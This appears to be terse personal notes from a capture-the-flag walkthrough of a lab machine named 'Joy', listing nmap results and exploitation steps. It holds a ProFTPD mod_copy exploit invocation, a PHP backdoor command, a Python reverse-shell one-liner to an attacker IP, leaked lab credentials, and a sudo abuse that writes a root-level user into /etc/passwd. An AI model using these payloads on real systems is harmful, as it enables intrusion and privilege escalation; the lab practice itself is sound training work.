----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# jou
# 27/12/2022

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.2.10
22/tcp  open  ssh         Dropbear sshd 0.34 (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
80/tcp  open  http        Apache httpd 2.4.25
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
465/tcp open  smtp        Postfix smtpd
587/tcp open  smtp        Postfix smtpd
993/tcp open  ssl/imap    Dovecot imapd
995/tcp open  ssl/pop3    Dovecot pop3d

----------------------------------------------------
ftp
----------------------------------------------------
login as anonymous
cd upload
get directory
telnet 10.0.2.22 21
site cpfr /home/patrick/version_control
site cpto /home/ftp/upload/version_control

again login with ftp and cat that copied version no from upload dir


git clone https://github.com/t0kx/exploit-CVE-2015-3306.git

./exploit.py --host 10.0.2.22 --port 21 --path "/var/www/tryingharderisjoy"

http://10.0.2.22/backdoor.php?cmd=ls

rlwrap nc -lvnp 1234

http://10.0.2.22/backdoor.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.9",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

cd ossec
cat patricksecretsofjoy
patrick:apollo098765
root:howtheheckdoiknowwhattherootpasswordis

how would these hack3rs ever find such a page?


su patrick

sudo -l

Matching Defaults entries for patrick on JOY:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User patrick may run the following commands on JOY:
    (ALL) NOPASSWD: /home/patrick/script/test



sudo /home/patrick/script/test

../../../../etc/passwd
777


shub:$1$abc$czj10a8hEuHoKfs5PmF8//:0:0:root:/root:/bin/bash